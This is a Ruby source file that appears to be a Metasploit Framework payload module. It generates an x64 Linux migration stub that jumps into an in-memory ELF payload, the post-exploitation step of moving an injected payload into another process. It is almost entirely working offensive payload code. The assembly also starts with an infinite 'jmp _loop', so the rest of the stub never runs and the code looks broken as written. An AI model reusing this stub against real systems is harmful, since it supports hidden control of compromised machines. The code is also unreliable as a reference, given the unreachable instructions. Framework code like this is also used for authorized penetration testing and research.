# -*- coding: binary -*-

require 'rex/elfparsey'
module Msf

###
#
# Payload that supports migration on x64.
#
###

module Payload::Linux::X64::MigrateHttp
  
  include Msf::Payload::Linux::X64::Migrate


  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux HTTP Migration (x64)',
      'Description' => 'Migration stub x64',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X64
    ))
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate_migrate(opts={})
    entry_offset = elf_ep(opts[:payload])
    %^
  _loop:
      jmp _loop
      pop r11
      pop r10
      pop rsi
      
      ; setup stack
      and rsp, -0x10              ; Align
      add sp, 80                  ; Add room for initial stack and prog name
      xor rbx, rbx
      push rbx                    ; NULL
      push rbx                    ; AT_NULL
      push rsi                    ; mmap'd address
      mov rax, 7                  ; AT_BASE
      push rax
      push rbx                    ; end of ENV
      push rbx                    ; NULL
      mov rax, 0                  ; ARGC
      push rax

      ; down the rabbit hole
      mov rax, #{entry_offset}
      add rsi, rax
      jmp rsi

    ^
  end

end

end

